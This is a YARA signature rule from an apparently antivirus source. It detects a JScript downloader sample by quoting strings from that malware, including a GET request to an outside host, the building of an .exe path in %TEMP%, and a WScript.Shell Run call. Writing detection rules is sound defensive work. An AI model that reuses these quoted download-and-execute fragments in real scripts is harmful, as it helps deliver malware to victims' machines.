rule sig_20160328_4f0e8eb7150dd65cae3d7f8c68cb6a70 {
  meta:
    description = "datamaliciousorder - file 20160328_4f0e8eb7150dd65cae3d7f8c68cb6a70.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0d37b75ba383541ca45e11e3083386d92cc066e7202febf6b2b31ddbaa2f7bbb"

  strings:
    $s1  = "Pluefve[Ijbalw](\"GET\", \"http://mediaheadllc.com/k9ospw1\", false);" fullword ascii
    $s2  = "function Rtavtlvi() {return Fmrcue[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"rejoBclp4L.exe\";};" fullword ascii
    $s3  = "do {WScript[Argnmo](Xcvrovyooc() * 11)} while (Pluefve[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Fmrcue = function Ywigvsyxk() {return WScript[Cgcrhdaiof](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ekjubttiqy(Xkxmr, Vtgmjsrjh){return Xkxmr - Vtgmjsrjh;};" fullword ascii
    $s6  = "function Orilqi(Ovglai){Fmrcue[\"Run\"](Ovglai, Aqdsuqjm, Aqdsuqjm);};" fullword ascii
    $s7  = "function Sihafe() {return ((Krgtmlkkfz == true) && (Krgtmlkkfz == Lfcpo)) ? 1 : Aqdsuqjm;};" fullword ascii
    $s8  = "Lfcpo = true; " fullword ascii
    $s9  = " while (Iofffgr){" fullword ascii
    $s10 = "var Krgtmlkkfz = false;" fullword ascii
    $s11 = "function Xcvrovyooc(){return 22;};" fullword ascii
    $s12 = "Krgtmlkkfz = true; " fullword ascii
    $s13 = "var Lfcpo = false;" fullword ascii
    $s14 = "function Qaovtdvtff(){return Cgcrhdaiof;};" fullword ascii
    $s15 = "function Kousovv()" fullword ascii
    $s16 = "return Ekjubttiqy(Szybjg, Skxcpluin);" fullword ascii
    $s17 = "function Xrpxb(){return Daejyrubth;};" fullword ascii
    $s18 = "var Nwqdts = false;" fullword ascii
    $s19 = "function Cxnonsl(Cehinxt) {var Zflgv = (1, 2, 3, 4, 5, Cehinxt); return Zflgv;};" fullword ascii
    $s20 = "var Btambxtep = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}